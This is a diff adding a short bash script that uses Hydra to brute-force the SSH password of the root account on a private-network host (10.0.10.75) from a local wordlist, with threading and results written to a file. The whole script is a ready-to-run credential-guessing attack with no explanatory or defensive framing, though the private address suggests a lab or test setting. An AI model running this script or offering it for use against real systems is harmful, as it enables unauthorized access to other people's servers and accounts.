@@ -1,0 +1,22 @@
+#!/bin/bash
+
+# Target IP and username
+TARGET="10.0.10.75"
+USERNAME="root"
+
+# Path to your password list (modify if needed)
+WORDLIST="./passwords.txt"
+
+# Number of threads (adjust for speed)
+THREADS=4
+
+# Check if password list exists
+if [ ! -f "$WORDLIST" ]; then
+  echo "[!] Password list not found at $WORDLIST"
+  exit 1
+fi
+
+echo "[*] Starting brute-force against $USERNAME@$TARGET using Hydra..."
+hydra -l $USERNAME -P $WORDLIST ssh://$TARGET -t $THREADS -f -V -o hydra_ssh_results.txt
+
+echo "[✔] Attack completed. Results saved to hydra_ssh_results.txt"
